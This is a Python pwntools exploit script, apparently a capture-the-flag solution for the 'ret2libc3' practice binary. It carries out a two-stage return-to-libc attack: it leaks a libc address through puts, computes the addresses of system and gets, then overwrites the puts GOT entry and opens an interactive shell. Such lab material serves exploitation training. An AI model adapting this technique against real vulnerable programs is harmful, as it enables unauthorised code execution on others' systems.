#!/usr/bin/env python
from pwn import *
context.arch = 'i386'
context.log_level = 'debug'
p = process('./ret2libc3')
elf = ELF('./ret2libc3')
libc = ELF('/lib/i386-linux-gnu/libc.so.6')
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
libc_start_main_got = elf.got['__libc_start_main']
main = elf.symbols['main']
print 'puts_plt =', hex(puts_plt)
print 'puts_got =', hex(puts_got)
print 'libc_start_main_got =', hex(libc_start_main_got)
print 'main =', hex(main)
libc_start_main_offset = libc.symbols['__libc_start_main']
system_offset = libc.symbols['system']
gets_offset = libc.symbols['gets']
print 'libc_start_main_offset =', hex(libc_start_main_offset)
print 'system_offset =', hex(system_offset)
print 'gets_offset =', hex(gets_offset)
gdb.attach(p, 'b *puts+331')
offset1 = 112
payload1 = (
	'A' * offset1 + 
	p32(puts_plt) + 
	p32(main) + 
	p32(libc_start_main_got)
)
p.recvuntil('Can you find it !?')
p.sendline(payload1)
libc_start_main_addr = u32(p.recv()[:4])
libcbase = libc_start_main_addr - libc_start_main_offset
print 'libcbase =', hex(libcbase)
system_addr = libcbase + system_offset
gets_addr = libcbase + gets_offset
print 'system_addr =', hex(system_addr)
print 'gets_addr =', hex(gets_addr)
offset2 = 104
payload2 = (
	'B' * offset2 + 
	p32(gets_addr) + 
	p32(system_addr) + 
	p32(puts_got) + 
	p32(puts_got)
)
p.sendline(payload2)
p.interactive()
